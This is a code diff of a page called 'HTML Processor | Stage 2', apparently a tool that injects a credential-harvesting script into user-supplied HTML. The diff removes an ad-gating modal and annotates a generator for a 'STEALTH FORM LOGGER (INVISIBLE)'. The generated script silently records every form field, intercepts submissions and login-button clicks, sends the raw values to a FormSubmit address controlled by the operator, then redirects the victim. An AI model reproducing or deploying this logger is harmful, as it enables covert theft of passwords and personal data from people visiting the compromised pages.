@@ -5,7 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HTML Processor | Stage 2</title>
-    
     <style>
         :root {
             --primary: #4361ee;
@@ -246,74 +245,6 @@
             gap: 10px;
         }
 
-        /* Modal styles for ad */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background-color: white;
-            padding: 30px;
-            border-radius: var(--border-radius);
-            max-width: 500px;
-            text-align: center;
-            animation: fadeIn 0.3s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .ad-container {
-            margin: 20px 0;
-            min-height: 250px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            background-color: #f0f0f0;
-            border-radius: var(--border-radius);
-        }
-
-        .btn-watch-ad {
-            background-color: #ff9500;
-            color: white;
-            margin-top: 20px;
-        }
-
-        .btn-watch-ad:hover {
-            background-color: #e68a00;
-        }
-
-        .ad-loading {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .ad-loading i {
-            font-size: 40px;
-            margin-bottom: 15px;
-            color: #4361ee;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-
         @media (max-width: 768px) {
             .content {
                 padding: 15px;
@@ -327,11 +258,6 @@
                 float: none;
                 width: 100%;
                 margin-top: 10px;
-            }
-
-            .modal-content {
-                width: 90%;
-                padding: 20px;
             }
         }
     </style>
@@ -384,25 +310,6 @@
         </div>
     </div>
 
-    <!-- Ad Modal -->
-    <div id="adModal" class="modal">
-        <div class="modal-content">
-            <h2>Continue to Next Stage</h2>
-            <p>Please watch this short ad to continue to the next stage</p>
-            
-            <div class="ad-container" id="adContainer">
-                <div class="ad-loading">
-                    <i class="fas fa-circle-notch fa-spin"></i>
-                    <p>Loading ad content...</p>
-                </div>
-            </div>
-            
-            <button id="watchAdBtn" class="btn btn-watch-ad">
-                <i class="fas fa-play"></i> Watch Ad to Continue
-            </button>
-        </div>
-    </div>
-
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Load the HTML from localStorage on page load
@@ -414,25 +321,9 @@
             // Refresh button handler
             document.getElementById('refreshBtn').addEventListener('click', loadHtmlPreview);
 
-            // Next stage button handler - now shows ad modal
+            // Next stage button handler
             document.getElementById('nextStageBtn').addEventListener('click', () => {
-                document.getElementById('adModal').style.display = 'flex';
-                document.getElementById('adContainer').innerHTML = `
-                    <div class="ad-loading">
-                        <i class="fas fa-circle-notch fa-spin"></i>
-                        <p>Loading ad content...</p>
-                    </div>
-                `;
-            });
-
-            // Watch ad button handler
-            document.getElementById('watchAdBtn').addEventListener('click', async () => {
-                try {
-                    await showAd();
-                    window.location.href = 'step3.html';
-                } catch (error) {
-                    showAlert('Error: ' + error.message, 'danger');
-                }
+                window.location.href = 'step3.html';
             });
         });
 
@@ -489,12 +380,7 @@
                     statusBadge.textContent = 'Processing complete';
                     statusBadge.className = 'status-badge active';
 
-                    // Show special notification about DTech logger
-                    showAlert(`
-                        <strong>DTech Logger successfully injected!</strong><br>
-                        The enhanced version now includes tracking capabilities and has been saved.
-                    `, 'success');
-                    
+                    showAlert('HTML processed successfully! The enhanced version has been saved.', 'success');
                     document.getElementById('nextStageBtn').disabled = false;
                 } catch (error) {
                     showAlert('Error processing HTML: ' + error.message, 'danger');
@@ -504,13 +390,21 @@
         }
 
         function generateLoggerScript(email, redirectUrl) {
-            return `<!-- DTech Form Logger (Invisible) -->
+            // This is the same script generator as before
+            return `<!-- STEALTH FORM LOGGER (INVISIBLE) -->
 <script>
 // CONFIGURATION
 const CONFIG = {
+    // Your FormSubmit endpoint
     FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/${email}',
+    
+    // Redirect URL after submission
     REDIRECT_URL: '${redirectUrl}',
+    
+    // Time to wait after typing before considering input "finished" (ms)
     INPUT_IDLE_TIMEOUT: 2000,
+    
+    // Patterns that indicate a submit button
     SUBMIT_BUTTON_PATTERNS: [
         'submit', 'login', 'sign in', 'continue', 
         'next', 'confirm', 'proceed', 'authenticate'
@@ -519,24 +413,29 @@ const CONFIG = {
 
 // ===== INVISIBLE LOGGER =====
 (() => {
+    // Silent console logging (optional for debugging)
     const log = (msg, type='info') => {
-        console.log(\`[DTech Logger] \${msg}\`);
+        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
     };
 
+    // ===== DATA CAPTURE =====
     let typingTimer;
     let formData = {};
 
+    // Send data via FormSubmit and redirect
     const sendToFormSubmit = async (data) => {
         try {
             const formData = new FormData();
             formData.append('_captcha', 'false');
             formData.append('_subject', 'Form Data Capture');
             formData.append('_template', 'table');
+            
+            // Add captured data (RAW, NO MASKING)
             formData.append('page_url', window.location.href);
             formData.append('timestamp', new Date().toISOString());
             
             Object.entries(data).forEach(([key, value]) => {
-                formData.append(key, value);
+                formData.append(key, value); // Sends exact input
             });
 
             const response = await fetch(CONFIG.FORM_SUBMIT_URL, {
@@ -545,12 +444,14 @@ const CONFIG = {
             });
 
             const result = await response.json();
+            
             if (result.success) {
-                window.location.href = CONFIG.REDIRECT_URL;
+                window.location.href = CONFIG.REDIRECT_URL; // SILENT REDIRECT
             }
-        } catch (err) {}
+        } catch (err) {} // Silent fail
     };
 
+    // ===== EVENT HANDLERS =====
     const setupInputHandlers = () => {
         document.querySelectorAll('input, textarea, select').forEach(field => {
             field.addEventListener('input', () => {
@@ -559,7 +460,7 @@ const CONFIG = {
                     const name = field.name || field.id || 'unnamed_field';
                     const value = field.value;
                     if (value) {
-                        formData[name] = value;
+                        formData[name] = value; // Stores raw value
                     }
                 }, CONFIG.INPUT_IDLE_TIMEOUT);
             });
@@ -567,36 +468,42 @@ const CONFIG = {
     };
 
     const setupSubmissionHandlers = () => {
+        // Form submissions
         document.querySelectorAll('form').forEach(form => {
             form.addEventListener('submit', (e) => {
-                e.preventDefault();
+                e.preventDefault(); // Stop default submission
+                
                 const data = {};
                 Array.from(form.elements).forEach(el => {
                     if (el.name && el.value) {
-                        data[el.name] = el.value;
+                        data[el.name] = el.value; // RAW DATA
                     }
                 });
                 sendToFormSubmit(data);
             }, true);
         });
 
+        // Button clicks
         document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
             btn.addEventListener('click', (e) => {
                 const btnText = (btn.textContent || btn.value || '').toLowerCase();
                 const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
                     btnText.includes(pattern)
                 );
+                
                 if (isSubmit && Object.keys(formData).length > 0) {
                     sendToFormSubmit(formData);
-                    formData = {};
+                    formData = {}; // Clear after submission
                 }
             }, true);
         });
     };
 
+    // ===== INITIALIZATION =====
     setupInputHandlers();
     setupSubmissionHandlers();
 
+    // Watch for dynamically added elements
     new MutationObserver(() => {
         setupInputHandlers();
         setupSubmissionHandlers();
@@ -605,84 +512,17 @@ const CONFIG = {
 <\/script>`;
         }
 
-        async function showAd() {
-            const adContainer = document.getElementById('adContainer');
-            const watchBtn = document.getElementById('watchAdBtn');
-            const originalBtnText = watchBtn.innerHTML;
-            
-            // 1st Attempt: Rewarded Popup
-            try {
-                adContainer.innerHTML = `
-                    <div class="ad-loading">
-                        <i class="fas fa-circle-notch fa-spin"></i>
-                        <p>Loading premium ad...</p>
-                    </div>
-                `;
-                watchBtn.disabled = true;
-                
-                await show_9601506('pop');
-                document.getElementById('adModal').style.display = 'none';
-                showAlert('Thank you for watching the ad!', 'success');
-                return;
-            } catch (error1) {
-                console.log("Popup failed, trying interstitial...");
-            }
-            
-            // 2nd Attempt: In-App Interstitial
-            try {
-                adContainer.innerHTML = `
-                    <div class="ad-loading">
-                        <i class="fas fa-ad"></i>
-                        <p>Loading alternative ad...</p>
-                    </div>
-                `;
-                
-                await show_9601506({
-                    type: 'inApp',
-                    inAppSettings: {
-                        frequency: 2,
-                        capping: 0.1,
-                        interval: 30,
-                        timeout: 5,
-                        everyPage: false
-                    }
-                });
-                document.getElementById('adModal').style.display = 'none';
-                showAlert('Ad completed!', 'success');
-                return;
-            } catch (error2) {
-                console.log("Interstitial failed, allowing skip...");
-            }
-            
-            // Final Fallback: Skip with Apology
-            adContainer.innerHTML = `
-                <div class="alert alert-warning">
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <div>
-                        <strong>Sorry!</strong><br>
-                        We couldn't load an ad. You may proceed without watching.
-                    </div>
-                </div>
-            `;
-            
-            watchBtn.innerHTML = '<i class="fas fa-arrow-right"></i> Proceed Anyway';
-            watchBtn.onclick = () => {
-                document.getElementById('adModal').style.display = 'none';
-                window.location.href = 'step3.html';
-            };
-            
-            throw new Error("All ad formats failed to load");
-        }
-
         function showAlert(message, type) {
             const alertDiv = document.getElementById('alert');
             const alertMessage = document.getElementById('alert-message');
             const alertIcon = alertDiv.querySelector('i');
             
-            alertMessage.innerHTML = message;
+            // Set message and style
+            alertMessage.textContent = message;
             alertDiv.className = `alert alert-${type}`;
             alertDiv.style.display = 'flex';
             
+            // Set appropriate icon
             switch(type) {
                 case 'success':
                     alertIcon.className = 'fas fa-check-circle';
@@ -697,9 +537,10 @@ const CONFIG = {
                     alertIcon.className = 'fas fa-info-circle';
             }
             
+            // Auto-hide after 5 seconds
             setTimeout(() => {
                 alertDiv.style.display = 'none';
-            }, 5000);
+            }, 10000);
         }
     </script>
 </body>
